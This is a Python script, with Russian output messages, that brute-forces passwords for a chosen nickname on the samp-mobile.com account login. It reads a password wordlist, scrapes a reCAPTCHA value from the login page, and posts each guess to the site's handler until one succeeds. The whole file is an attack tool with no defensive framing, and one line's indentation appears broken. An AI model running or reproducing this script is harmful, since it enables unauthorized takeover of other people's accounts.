# -*- coding: utf-8 -*-
import aiohttp
import asyncio
import requests_html
import json


async def main():
	session = aiohttp.ClientSession()
	parser = requests_html.AsyncHTMLSession()

	settings = open('settings.json')
	settings = settings.read()
	settings = json.loads(settings)

	userName = settings['nickname']
	base = open(settings['files'][0]['path'])
	base = base.read()
	base = base.split()

	for userPassword in base:
		response = await parser.get('https://samp-mobile.com/account/')
		await response.html.arender()
		g_recaptcha_response = response.html.find('input')
		g_recaptcha_response = g_recaptcha_response[2]
        g_recaptcha_response = g_recaptcha_response.attrs['value']
		data = {
			"user_name" : userName,
			"user_password" : userPassword,
			"act" : "account_login",
			"g-recaptcha-response" : g_recaptcha_response
		}
		response = await session.post('https://samp-mobile.com/system/global_classes/Handler.php', data=data)
		response = await response.json()
		status = response['status']
		if status == 'ok':
			print('Верный пароль: {}'.format(userPassword))
			input()
			exit()
		else:
			print('Текущий пароль: {}'.format(userPassword))

loop = asyncio.get_event_loop()
loop.run_until_complete(main())